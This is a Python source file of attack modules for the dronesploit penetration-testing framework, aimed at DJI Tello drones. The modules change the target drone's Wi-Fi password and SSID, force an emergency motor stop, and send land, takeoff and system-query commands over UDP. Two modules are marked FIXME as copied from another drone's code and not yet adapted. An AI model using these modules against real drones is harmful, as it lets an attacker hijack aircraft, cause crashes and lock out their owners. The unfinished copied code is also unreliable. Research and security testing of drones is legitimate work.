# -*- coding: UTF-8 -*-
from dronesploit.drones.dji import TelloModule
from dronesploit.wifi.mixin import ConnectMixin
from sploitkit import *


class ChangeApPassword(TelloModule):
    """ Change the password of the target C-me's AP. """
    config = Config({
        Option(
            'NEW_PASSWORD',
            "Target's new password",
            True,
        ): "12345678",
    })
    
    def run(self):
        #FIXME: this was copied from command/hobbico/cme ; to be adapted wrt Tello's methods
        self._change_ap_creds(self.config.option("TARGET").value, self.config.option("NEW_PASSWORD").value, False)


class ChangeApSsid(TelloModule, ConnectMixin):
    """ Change the SSID of the target C-me's AP. """
    config = Config({
        Option(
            'NEW_SSID',
            "Target's new SSID",
            True,
        ): "TELLO-abcdef",
    })
    
    def run(self):
        #FIXME: this was copied from command/hobbico/cme ; to be adapted wrt Tello's methods
        essid = self.config.option("TARGET").value
        new_essid = self.config.option("NEW_SSID").value
        t = self.console.state['TARGETS']
        pswd = t[essid]['password']
        if self._change_ap_creds(new_essid, pswd):
            t[new_essid] = {k: new_essid if k == "essid" else v for k, v in t[essid].items()}
            self.config['NEW_SSID'] = essid
            del t[essid]
            self.console.root.interfaces
            self.config['TARGET'] = new_essid if self.connect(new_essid) is not None else None


class EmergencyStop(TelloModule):
    """ Stopping the target Tello in emergency. """
    def run(self):
        self._send_udp_command("emergency")


class GetSysInfo(TelloModule):
    """ Get system information from the target Tello. """
    def run(self):
        self._send_udp_command("temp?")
        print_formatted_text(self._last_cmd_resp)


class Land(TelloModule):
    """ Land the target Tello. """
    def run(self):
        self._send_udp_command("land")


class Takeoff(TelloModule):
    """ Takeoff the target Tello. """
    def run(self):
        self._send_udp_command("takeoff")

